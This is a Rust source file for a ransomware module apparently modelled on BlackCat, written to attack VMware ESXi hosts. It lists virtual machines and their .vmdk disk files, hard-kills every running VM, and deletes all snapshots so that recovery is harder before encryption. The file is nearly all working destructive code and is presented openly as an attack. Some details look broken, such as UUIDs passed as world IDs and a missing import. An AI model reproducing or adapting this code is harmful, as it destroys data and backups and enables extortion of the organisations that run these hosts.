use std::process::Command;

pub struct ESXiAttacker {
    config: crate::config::BlackCatConfig,
}

impl ESXiAttacker {
    pub fn new(config: crate::config::BlackCatConfig) -> Self {
        ESXiAttacker { config }
    }
    
    /// Получает список всех запущенных VM используя esxcli
    pub fn enumerate_running_vms(&self) -> Result<Vec<VMInfo>, Box<dyn std::error::Error>> {
        if !self.config.esxi_options.enable_vm_encryption {
            return Ok(Vec::new());
        }
        
        println!("[*] Enumerating running VMs...");
        
        // esxcli vm process list
        let output = Command::new("esxcli")
            .args(&["vm", "process", "list"])
            .output()?;
        
        let output_str = String::from_utf8_lossy(&output.stdout);
        let mut vms = Vec::new();
        
        // Парсим output
        for line in output_str.lines() {
            if line.contains("UUID:") {
                if let Some(uuid_part) = line.split("UUID:").nth(1) {
                    let uuid = uuid_part.trim().to_string();
                    vms.push(VMInfo { uuid });
                }
            }
        }
        
        println!("[*] Found {} running VMs", vms.len());
        Ok(vms)
    }
    
    /// Получает список всех VMs в datastore (зашифрованных или нет)
    pub fn enumerate_all_vms(&self) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
        println!("[*] Enumerating all VMs in datastore...");
        
        let mut vmdk_files = Vec::new();
        
        // Проверяем стандартные datastore пути
        for datastore in &self.config.esxi_options.target_datastores {
            let datastore_path = format!("/vmfs/volumes/{}", datastore);
            
            println!("[*] Scanning datastore: {}", datastore_path);
            
            // Рекурсивно ищем .vmdk файлы
            let output = Command::new("find")
                .args(&[&datastore_path, "-name", "*.vmdk", "-type", "f"])
                .output();
            
            if let Ok(output) = output {
                let output_str = String::from_utf8_lossy(&output.stdout);
                for vmdk_file in output_str.lines() {
                    vmdk_files.push(vmdk_file.into());
                }
            }
        }
        
        println!("[*] Found {} VMDK files", vmdk_files.len());
        Ok(vmdk_files)
    }
    
    /// Завершает все запущенные VM перед шифрованием
    pub fn terminate_running_vms(&self) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.esxi_options.enable_vm_termination {
            return Ok(());
        }
        
        println!("[*] Terminating all running VMs...");
        
        let vms = self.enumerate_running_vms()?;
        
        for vm in vms {
            println!("[*] Killing VM with UUID: {}", vm.uuid);
            
            // esxcli vm process kill --type=hard --world-id=<UUID>
            let _output = Command::new("esxcli")
                .args(&[
                    "vm", "process", "kill",
                    "--type=hard",
                    &format!("--world-id={}", vm.uuid)
                ])
                .output();
        }
        
        println!("[+] VM termination completed");
        Ok(())
    }
    
    /// Удаляет все snapshots VM перед шифрованием
    pub fn delete_snapshots(&self) -> Result<(), Box<dyn std::error::Error>> {
        if !self.config.esxi_options.enable_snapshot_deletion {
            return Ok(());
        }
        
        println!("[*] Deleting VM snapshots...");
        
        let vms = self.enumerate_running_vms()?;
        
        for vm in vms {
            println!("[*] Removing snapshots for VM: {}", vm.uuid);
            
            // vim-cmd vmsvc/snapshot.removeall <vmid>
            let _output = Command::new("vim-cmd")
                .args(&["vmsvc/snapshot.removeall", &vm.uuid])
                .output();
        }
        
        println!("[+] Snapshot deletion completed");
        Ok(())
    }
    
    /// Основная функция для ESXi атаки
    pub async fn execute(&self) -> Result<(), Box<dyn std::error::Error>> {
        println!("[*] Starting BlackCat ESXi attack...");
        
        // Фаза 1: VM Enumeration
        self.enumerate_all_vms()?;
        
        // Фаза 2: VM Termination
        self.terminate_running_vms()?;
        
        // Фаза 3: Snapshot Deletion
        self.delete_snapshots()?;
        
        println!("[+] ESXi attack preparation completed");
        Ok(())
    }
}

#[derive(Debug, Clone)]
pub struct VMInfo {
    pub uuid: String,
}
